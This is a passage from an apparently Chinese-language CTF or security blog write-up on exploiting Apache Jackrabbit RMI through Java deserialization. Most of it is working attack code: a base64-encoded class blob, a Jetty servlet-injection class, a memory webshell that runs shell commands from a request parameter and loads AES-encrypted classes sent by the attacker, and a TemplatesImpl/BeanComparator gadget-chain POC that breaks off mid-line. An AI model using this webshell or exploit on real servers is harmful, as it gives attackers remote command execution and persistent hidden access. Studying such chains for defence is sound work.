ANMMANQA1QwA1gDXBwDYDADZANoBAB5bK10gRHluYW1pYyBTZXJ2bGV0IHNheXMgaGVsbG8HANsMANwA3QEABHR5cGUHAN4MAN8A4AEABWJhc2ljDADCAOEBAARwYXNzDADiAOMHAOQMAOUAVAEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcA5gwA5wDoDADpAOoHAOsMAOwA7QwASgDuAQACXEEMAO8A8AwA8QDyBwDzDAD0APUHAPYBABBlNDVlMzI5ZmViNWQ5MjViDAD3AOAMAPgA8gEABFBPU1QMAPkA+gEAAXUHAPsMAPwA/QEAA0FFUwcA/gwA/wEAAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEBAQIMAQMBBAEAAAwBAwEFDAEGAPIMAEoBBwwBCAEJDAEKAQsHAQwMAQ0A8gwAUQBSDAEOANcBAB5vcmcvZXhhbXBsZS9TZXJ2bGV0VGVtcGxhdGVzJFUMAQ8BEAwBEQESDABKARMMARQBFQwBFgEXAQAGZXF1YWxzAQAPamF2YS9sYW5nL0NsYXNzAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlDAEYARkBABBqYXZhL2xhbmcvT2JqZWN0BwEaDAEbARwBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEdAEsMAFwAXQEAHG9yZy9leGFtcGxlL1NlcnZsZXRUZW1wbGF0ZXMBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAGZGVjb2RlAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAdkb0ZpbmFsAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQA4KExvcmcvZXhhbXBsZS9TZXJ2bGV0VGVtcGxhdGVzO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQAhAEYARwAAAAAABQABAEoASwABAEwAAAAvAAEAAQAAAAUqtwABsQAAAAIATQAAAAYAAQAAABIATgAAAAwAAQAAAAUATwBQAAAACgBRAFIAAQBMAAAAZQACAAQAAAARKrYAAky4AANNLCu2AAROLbAAAAACAE0AAAASAAQAAAAUAAUAFQAJABYADwAXAE4AAAAqAAQAAAARAFMAVAAAAAUADABVAFYAAQAJAAgAVwBaAAIADwACAFsAVgADAAQAXABdAAIATAAAAogABwAJAAABYLIABRIGtgAHKxIIuQAJAgDGAIorEgi5AAkCABIKtgALmQB6KxIMuQAJAgBOLcYAai22AA2aAGMBOgSyAA4SD7YAC5kAGga9ABBZAxIRU1kEEhJTWQUtUzoEpwAXBr0AEFkDEhNTWQQSFFNZBS1TOgS7ABVZuAAWGQS2ABe2ABi3ABkSGrYAG7YAHDoFLLkAHQEAGQW2AB6nAMgrEh+5ACACAMYAvSu5ACEBABIitgALmQCnEgxOK7kAIwEAEiQtuQAlAwASJrgAJzoEGQQFuwAoWbsAKVm3ACoruQAjAQASJLkAKwIAtgAsEi22AC62AC+2AAISJrcAMLYAMRkEK7kAMgEAtgAzuAA0tgA1OgW7ADZZKiq2ADe2ADi3ADkZBbYAOjoGGQa2ADs6BxkGEjwFvQA9WQMSPlNZBBI/U7YAQDoIGQgZBwW9AEFZAytTWQQsU7YAQlenAAhOLbYARLEAAQClAVcBWgBDAAMATQAAAGYAGQAAABsACAAdACMAHwAsACAANwAhADoAIgBFACMAXAAlAHAAJwCMACgAlwAqAKUALQCzAC4AtgAvAMQAMADLADEA/AAyAQ8AMwElADQBLAA1AUMANgFXADoBWgA4AVsAOQFfADwATgAAAIQADQA6AF0AXgBfAAQAjAALAGAAVAAFACwAawBhAFQAAwC2AKEAYgBUAAMAywCMAGMAZAAEAQ8ASABlAFYABQElADIAZgBnAAYBLAArAGgAaQAHAUMAFABqAGsACAFbAAQAbABtAAMAAAFgAE8AUAAAAAABYABuAG8AAQAAAWAAcABxAAIAcgAAABgAB/0AXAcAcwcAdBP5ACYC+wC8QgcAdQQAdgAAAAQAAQB3AAQAeABdAAIATAAAAEkAAwADAAAAByorLLYARbEAAAACAE0AAAAKAAIAAABAAAYAQQBOAAAAIAADAAAABwBPAFAAAAAAAAcAbgBvAAEAAAAHAHAAcQACAHYAAAAEAAEAdwAJAHkAegABAEwAAAArAAAAAQAAAAGxAAAAAgBNAAAABgABAAAASwBOAAAADAABAAAAAQB7AF8AAAACAHwAAAACAH0ASQAAABIAAgA2AEYASAAAAFgAgABZAAk=&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">EvilServlet</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">addFilterWithMapping</span> <span class="operator">=</span> GetMethod(servletHandler, <span class="string">&quot;addServletWithMapping&quot;</span>, Class.class, String.class);</span><br><span class="line">            addFilterWithMapping.invoke(servletHandler, EvilServlet, <span class="string">&quot;/boogipop&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectJettyServletShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadServlet();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectServlet();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InjectJettyServletShell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ServletTemplates.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTemplates</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Dynamic Servlet says hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;type&quot;</span>) != <span class="literal">null</span> &amp;&amp; request.getParameter(<span class="string">&quot;type&quot;</span>).equals(<span class="string">&quot;basic&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//basic cmd shell</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty())&#123;</span><br><span class="line">                String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span>(File.separator.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getWriter().println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(request.getHeader(<span class="string">&quot;e45e329feb5d925b&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//behind3 shell</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">                    request.getSession().setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                    cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>((request.getSession().getAttribute(<span class="string">&quot;u&quot;</span>) + <span class="string">&quot;&quot;</span>).getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                    <span class="type">byte</span>[] evilClassBytes = cipher.doFinal(BASE64Decoder(request.getReader().readLine()));</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(evilClassBytes);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> evilClass.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> evilClass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServletRequest.class, ServletResponse.class&#125;);</span><br><span class="line">                    targetMethod.invoke(evilObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先是编译ServletTemplates.java文件   然后转化成base64编码</p><p><img src="../images/image-20231213172248562.png" alt="image-20231213172248562"></p><p>然后使用该脚本将换行服删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">multiline_string = <span class="string">&quot;&quot;&quot;base64编码&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">single_line_string = multiline_string.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(single_line_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后替换进InjectJettyServletShell中</p><p><img src="../images/image-20231213172415784.png" alt="image-20231213172415784"></p><p>再将其编译 </p><p>然后写入poc中</p><p><img src="../images/image-20231213172443643.png" alt="image-20231213172443643"></p><p>运行</p><p><img src="../images/image-20231213172507004.png" alt="image-20231213172507004"></p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.commons.JcrUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jcr.Repository;</span><br><span class="line"><span class="keyword">import</span> javax.jcr.SimpleCredentials;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object,String field_name,Object filed_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1vxyz&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2022.2.2\\project\\Apache_Jackrabbit_RMI\\target\\classes\\org\\example\\InjectJettyServletShell.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span 